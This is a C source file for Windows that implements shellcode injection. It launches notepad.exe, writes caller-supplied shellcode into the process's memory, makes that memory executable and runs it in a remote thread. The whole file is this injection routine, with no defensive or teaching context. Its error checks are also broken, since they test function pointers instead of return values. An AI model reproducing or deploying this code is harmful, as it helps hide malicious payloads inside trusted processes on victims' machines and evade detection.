#include "Box.h"

BOOL ShellInject
(
	IN PBYTE pShellcode,
	IN SIZE_T sShellSize
)

{

	HANDLE	hProcess	= NULL, 
			hThread		= NULL;
	PVOID	rBuffer		= NULL;
	DWORD	PID			= 0, 
			dwOldProt	= 0, 
			TID			= 0;
	BOOL	State		= TRUE;


	STARTUPINFO info = { sizeof(info) };
	PROCESS_INFORMATION processinfo;
	LPCWSTR path = L"C:\\Windows\\system32\\notepad.exe";


	CreateProcessW(path, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &info, &processinfo);
	if (CreateProcessW == NULL)
	{
		WARN("CreateProcessW Failed! With an Error: %lu", GetLastError());
		State = FALSE; goto CLEANUP;
	}


	PID = processinfo.dwProcessId;

	INFO("Current Process ID: %lu", PID);

	// Grab Process Handle
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (OpenProcess == NULL)
	{
		WARN("OpenProcess Failed! With an Error: %lu", GetLastError());
		State = FALSE; goto CLEANUP;
	}
	INFO("Opening a Handle to our Desired PID of: %lu...", PID);

	// Allocate memory (shellcode) to target process
	rBuffer = VirtualAllocEx(hProcess, NULL, sShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (VirtualAllocEx == NULL)
	{
		WARN("VirtualAllocEx Failed! With an Error: %lu", GetLastError());
		State = FALSE; goto CLEANUP;
	}
	INFO("Allocated %zu Bytes to Process' Virtual Address Space", sShellSize);

	// write memory (shellcode) to our target process
	WriteProcessMemory(hProcess, rBuffer, pShellcode, sShellSize, NULL);
	if (WriteProcessMemory == NULL)
	{
		WARN("WriteProcessMemory Failed! With an Error: %lu", GetLastError());
		State = FALSE; goto CLEANUP;
	}
	INFO("Successfully Wrote %zu Bytes to Process' Memory!", sShellSize);

	// change protection permissions
	VirtualProtectEx(hProcess, rBuffer, sShellSize, PAGE_EXECUTE_READ, &dwOldProt);
	if (VirtualProtectEx == NULL)
	{
		WARN("VirtualProtectEx Failed! With an Error: %lu", GetLastError());
		State = FALSE; goto CLEANUP;
	}
	INFO("Changed Allocating Protection from [RW] ----> [RX]");

	// create a new thread pointing to our payload (shellcode)
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
	if (CreateRemoteThreadEx == NULL)
	{
		WARN("CreateRemoteThreadEx Failed! With an Error: %lu", GetLastError());
		State = FALSE; goto CLEANUP;
	}
	INFO("Successfully Create a Thread Inside our Target Process");


	OKAY("Waiting!!!");
	WaitForSingleObject(hThread, INFINITE);
	OKAY("Successfully Completed Shellcode Injection! Cleaning up Our Mess :)");


CLEANUP:


	if (hProcess)
		CloseHandle(hProcess);

	if (hThread)
		CloseHandle(hThread);

	if (rBuffer)
		VirtualFreeEx(hProcess, rBuffer, 0, MEM_RELEASE);


	CloseHandle(processinfo.hProcess);
	CloseHandle(processinfo.hThread);


	return State;


}